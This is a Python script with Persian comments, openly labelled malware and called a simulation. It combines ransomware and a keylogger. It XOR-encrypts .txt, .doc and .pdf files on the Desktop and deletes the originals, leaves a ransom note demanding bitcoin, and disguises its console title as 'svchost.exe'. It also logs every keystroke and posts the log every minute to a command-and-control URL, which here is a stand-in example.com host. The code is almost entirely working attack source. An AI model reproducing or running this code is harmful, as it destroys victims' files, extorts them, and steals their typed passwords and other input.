import os
import ctypes
from ctypes import wintypes
import glob
import keyboard
import requests
from datetime import datetime
import threading
import time

# دسترسی به APIهای ویندوز
kernel32 = ctypes.WinDLL('kernel32')
user32 = ctypes.WinDLL('user32')

# کلید رمزنگاری (XOR)
ENCRYPTION_KEY = 0xAB

# مسیر پوشه هدف (مثلاً دسکتاپ)
TARGET_FOLDER = os.path.join(os.path.expanduser("~"), "Desktop")

# فایل برای ذخیره کلیدها
LOG_FILE = "keylog.txt"

# URL سرور دمو (فقط برای شبیه‌سازی)
C2_SERVER = "http://example.com/log"  # این فقط یه نمونه‌ست، سرور واقعی نیست

# تابع برای رمزنگاری فایل
def encrypt_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted_data = bytes(b ^ ENCRYPTION_KEY for b in data)
        with open(file_path + ".locked", 'wb') as f:
            f.write(encrypted_data)
        os.remove(file_path)  # حذف فایل اصلی
        return True
    except Exception as e:
        print(f"خطا در رمزنگاری {file_path}: {e}")
        return False

# تابع Keylogger
def keylogger():
    with open(LOG_FILE, "a") as f:
        f.write(f"Keylogger started at {datetime.now()}\n")
    
    def on_key(event):
        with open(LOG_FILE, "a") as f:
            f.write(f"{event.name} pressed at {datetime.now()}\n")
    
    keyboard.on_press(on_key)
    try:
        keyboard.wait()
    except KeyboardInterrupt:
        keyboard.unhook_all()

# تابع برای ارسال داده‌ها به سرور
def send_data_to_c2():
    while True:
        try:
            with open(LOG_FILE, "r") as f:
                data = f.read()
            requests.post(C2_SERVER, data={"keys": data})
            time.sleep(60)  # هر 60 ثانیه
        except Exception:
            pass

# تابع اصلی
def main():
    # تغییر نام پروسه برای پنهان‌سازی
    ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")  # شبیه‌سازی پروسه سیستمی

    # ایجاد فایل‌های تست اگه پوشه خالی باشه
    for i in range(3):
        with open(os.path.join(TARGET_FOLDER, f"test_file_{i}.txt"), "w") as f:
            f.write(f"This is a test file {i} for malware simulation.")

    # رمزنگاری فایل‌های txt
    file_extensions = ["*.txt", "*.doc", "*.pdf"]
    for ext in file_extensions:
        for file_path in glob.glob(os.path.join(TARGET_FOLDER, ext)):
            if encrypt_file(file_path):
                print(f"فایل {file_path} رمزنگاری شد!")

    # ایجاد فایل README.txt
    ransom_note = """هشدار! فایل‌های شما قفل شده‌اند!
برای باز کردن، 0.5 بیت‌کوین به آدرس زیر بفرستید:
1BitcoinAddressExample123
تماس: hacker@example.com
"""
    with open(os.path.join(TARGET_FOLDER, "README.txt"), "w") as f:
        f.write(ransom_note)

    # نمایش پیام‌باکس
    user32.MessageBoxW(None, "فایل‌های شما قفل شده‌اند! README.txt را بخوانید!", 
                       "هک شدید!", 0x10 | 0x1000)

    # شروع Keylogger در یه ترد جدا
    threading.Thread(target=keylogger, daemon=True).start()

    # شروع ارسال داده‌ها به سرور
    threading.Thread(target=send_data_to_c2, daemon=True).start()

    print("بدافزار اجرا شد! فایل README.txt را بررسی کنید.")

if __name__ == "__main__":
    main()
    # نگه داشتن برنامه تا پایان
    try:
        while True:
            time.sleep(1000)
    except KeyboardInterrupt:
        print("بدافزار متوقف شد!")